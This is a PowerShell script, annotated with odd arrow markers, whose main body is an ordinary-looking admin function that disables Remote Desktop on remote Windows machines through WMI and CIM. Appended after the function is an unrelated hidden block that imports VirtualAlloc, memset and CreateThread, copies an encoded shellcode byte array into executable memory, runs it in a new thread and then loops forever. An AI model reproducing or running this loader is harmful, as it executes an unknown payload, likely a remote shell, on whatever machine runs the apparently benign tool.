 -||-> function Disable-RemoteDesktop
{

	
	[CmdletBinding(DefaultParameterSetName = 'CimSession',
				   SupportsShouldProcess = $true)]
	PARAM (
		[Parameter(
				   ParameterSetName = "Main",
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
		[Alias("CN", "__SERVER", "PSComputerName")]
		[String[]]$ComputerName,

		[Parameter(ParameterSetName = "Main")]
		[Alias("RunAs")]
		[System.Management.Automation.Credential()]
		$Credential = [System.Management.Automation.PSCredential]::Empty,

		[Parameter(ParameterSetName = "CimSession")]
		[Microsoft.Management.Infrastructure.CimSession[]]$CimSession
	)
	BEGIN
	{
		
		 -||-> function Get-DefaultMessage
		{

			PARAM ($Message)
			 -||-> $DateFormat =  -||-> Get-Date -Format 'yyyy/MM/dd-HH:mm:ss:ff' <-||-  <-||- 
			 -||-> $FunctionName = ( -||-> Get-Variable -Scope 1 -Name MyInvocation -ValueOnly <-||- ).MyCommand.Name <-||- 
			 -||-> Write-Output "[$DateFormat][$FunctionName] $Message" <-||- 
		} <-||-  
	}
	PROCESS
	{
		 -||-> IF ( -||-> $PSBoundParameters['CimSession'] <-||- )
		{
			 -||-> FOREACH ($Cim in  -||-> $CimSession <-||- )
			{
				 -||-> $CIMComputer = $( -||-> $Cim.ComputerName <-||- ).ToUpper() <-||- 

				 -||-> IF ( -||-> $PSCmdlet.ShouldProcess($CIMComputer, "Disable Remote Desktop via Win32_TerminalServiceSetting") <-||- )
				{

					 -||-> TRY
					{
						
						 -||-> $CIMSplatting = @{
							Class =  -||-> "Win32_TerminalServiceSetting" <-||- 
							NameSpace =  -||-> "root\cimv2\terminalservices" <-||- 
							CimSession =  -||-> $Cim <-||- 
							ErrorAction =  -||-> 'Stop' <-||- 
							ErrorVariable =  -||-> "ErrorProcessGetCimInstance" <-||- 
						} <-||- 

						
						 -||-> $CIMInvokeSplatting = @{
							MethodName =  -||-> "SetAllowTSConnections" <-||- 
							Arguments =  -||-> @{
								AllowTSConnections =  -||-> 0 <-||- ;
								ModifyFirewallException =  -||-> 0 <-||- 
							} <-||- 
							ErrorAction =  -||-> 'Stop' <-||- 
							ErrorVariable =  -||-> "ErrorProcessInvokeCim" <-||- 
						} <-||- 

						 -||-> Write-Verbose -Message ( -||-> Get-DefaultMessage -Message "$CIMComputer - CIMSession - disable Remote Desktop (and Modify Firewall Exception" <-||- ) <-||- 
						 -||-> Get-CimInstance @CIMSplatting | Invoke-CimMethod @CIMInvokeSplatting <-||- 
					}
					CATCH
					{
						 -||-> Write-Warning -Message ( -||-> Get-DefaultMessage -Message "$CIMComputer - CIMSession - Something wrong happened" <-||- ) <-||- 
						 -||-> IF ( -||-> $ErrorProcessGetCimInstance <-||- ) {  -||-> Write-Warning -Message ( -||-> Get-DefaultMessage -Message "$CIMComputer - Issue with Get-CimInstance" <-||- ) <-||-  } <-||- 
						 -||-> IF ( -||-> $ErrorProcessInvokeCim <-||- ) {  -||-> Write-Warning -Message ( -||-> Get-DefaultMessage -Message "$CIMComputer - Issue with Invoke-CimMethod" <-||- ) <-||-  } <-||- 
						 -||-> Write-Warning -Message $Error[0].Exception.Message <-||- 
					} 
					FINALLY
					{
						 -||-> $CIMSplatting.Clear() <-||- 
						 -||-> $CIMInvokeSplatting.Clear() <-||- 
					} <-||- 
				} <-||- 
			} <-||-  
		} 
		ELSE
		{
			 -||-> FOREACH ($Computer in  -||-> $ComputerName <-||- )
			{
				 -||-> $Computer = $Computer.ToUpper() <-||- 

				 -||-> IF ( -||-> $PSCmdlet.ShouldProcess($Computer, "Disable Remote Desktop via Win32_TerminalServiceSetting") <-||- )
				{

					 -||-> TRY
					{
						 -||-> Write-Verbose -Message ( -||-> Get-DefaultMessage -Message "$Computer - Test-Connection" <-||- ) <-||- 
						 -||-> IF ( -||-> Test-Connection -Computer $Computer -count 1 -quiet <-||- )
						{
							 -||-> $Splatting = @{
								Class =  -||-> "Win32_TerminalServiceSetting" <-||- 
								NameSpace =  -||-> "root\cimv2\terminalservices" <-||- 
								ComputerName =  -||-> $Computer <-||- 
								Authentication =  -||-> 'PacketPrivacy' <-||- 
								ErrorAction =  -||-> 'Stop' <-||- 
								ErrorVariable =  -||-> 'ErrorProcessGetWmi' <-||- 
							} <-||- 

							 -||-> IF ( -||-> $PSBoundParameters['Credential'] <-||- )
							{
								 -||-> $Splatting.credential = $Credential <-||- 
							} <-||- 

							
							 -||-> Write-Verbose -Message ( -||-> Get-DefaultMessage -Message "$Computer - Get-WmiObject - disable Remote Desktop" <-||- ) <-||- 
							 -||-> ( -||-> Get-WmiObject @Splatting <-||- ).SetAllowTsConnections(0, 0) | Out-Null <-||- 

							
							
						} <-||- 
					}
					CATCH
					{
						 -||-> Write-Warning -Message ( -||-> Get-DefaultMessage -Message "$Computer - Something wrong happened" <-||- ) <-||- 
						 -||-> IF ( -||-> $ErrorProcessGetWmi <-||- ) {  -||-> Write-Warning -Message ( -||-> Get-DefaultMessage -Message "$Computer - Issue with Get-WmiObject" <-||- ) <-||-  } <-||- 
						 -||-> Write-Warning -MEssage $Error[0].Exception.Message <-||- 
					}
					FINALLY
					{
						 -||-> $Splatting.Clear() <-||- 
					} <-||- 
				} <-||- 
			} <-||-  
		} <-||-  
	} 
} <-||-  

 -||-> $br3a = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $br3a -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xda,0xcb,0xbf,0xd2,0x10,0x3a,0x33,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x7e,0x14,0x03,0x7e,0xc6,0xf2,0xcf,0xcf,0x0e,0x70,0x2f,0x30,0xce,0x15,0xb9,0xd5,0xff,0x15,0xdd,0x9e,0xaf,0xa5,0x95,0xf3,0x43,0x4d,0xfb,0xe7,0xd0,0x23,0xd4,0x08,0x51,0x89,0x02,0x26,0x62,0xa2,0x77,0x29,0xe0,0xb9,0xab,0x89,0xd9,0x71,0xbe,0xc8,0x1e,0x6f,0x33,0x98,0xf7,0xfb,0xe6,0x0d,0x7c,0xb1,0x3a,0xa5,0xce,0x57,0x3b,0x5a,0x86,0x56,0x6a,0xcd,0x9d,0x00,0xac,0xef,0x72,0x39,0xe5,0xf7,0x97,0x04,0xbf,0x8c,0x63,0xf2,0x3e,0x45,0xba,0xfb,0xed,0xa8,0x73,0x0e,0xef,0xed,0xb3,0xf1,0x9a,0x07,0xc0,0x8c,0x9c,0xd3,0xbb,0x4a,0x28,0xc0,0x1b,0x18,0x8a,0x2c,0x9a,0xcd,0x4d,0xa6,0x90,0xba,0x1a,0xe0,0xb4,0x3d,0xce,0x9a,0xc0,0xb6,0xf1,0x4c,0x41,0x8c,0xd5,0x48,0x0a,0x56,0x77,0xc8,0xf6,0x39,0x88,0x0a,0x59,0xe5,0x2c,0x40,0x77,0xf2,0x5c,0x0b,0x1f,0x37,0x6d,0xb4,0xdf,0x5f,0xe6,0xc7,0xed,0xc0,0x5c,0x40,0x5d,0x88,0x7a,0x97,0xa2,0xa3,0x3b,0x07,0x5d,0x4c,0x3c,0x01,0x99,0x18,0x6c,0x39,0x08,0x21,0xe7,0xb9,0xb5,0xf4,0x92,0xbc,0x21,0xde,0x8b,0x9b,0xac,0x48,0x4e,0xe4,0xde,0x69,0xc7,0x02,0x8e,0x39,0x88,0x9a,0x6e,0xea,0x68,0x4b,0x06,0xe0,0x66,0xb4,0x36,0x0b,0xad,0xdd,0xdc,0xe4,0x18,0xb5,0x48,0x9c,0x00,0x4d,0xe9,0x61,0x9f,0x2b,0x29,0xe9,0x2c,0xcb,0xe7,0x1a,0x58,0xdf,0x9f,0xea,0x17,0xbd,0x09,0xf4,0x8d,0xa8,0xb5,0x60,0x2a,0x7b,0xe2,0x1c,0x30,0x5a,0xc4,0x82,0xcb,0x89,0x5f,0x0a,0x5e,0x72,0x37,0x73,0x8e,0x72,0xc7,0x25,0xc4,0x72,0xaf,0x91,0xbc,0x20,0xca,0xdd,0x68,0x55,0x47,0x48,0x93,0x0c,0x34,0xdb,0xfb,0xb2,0x63,0x2b,0xa4,0x4d,0x46,0xad,0x98,0x9b,0xae,0xdb,0xf0,0x1f <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $Fis=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $Fis.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$Fis,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



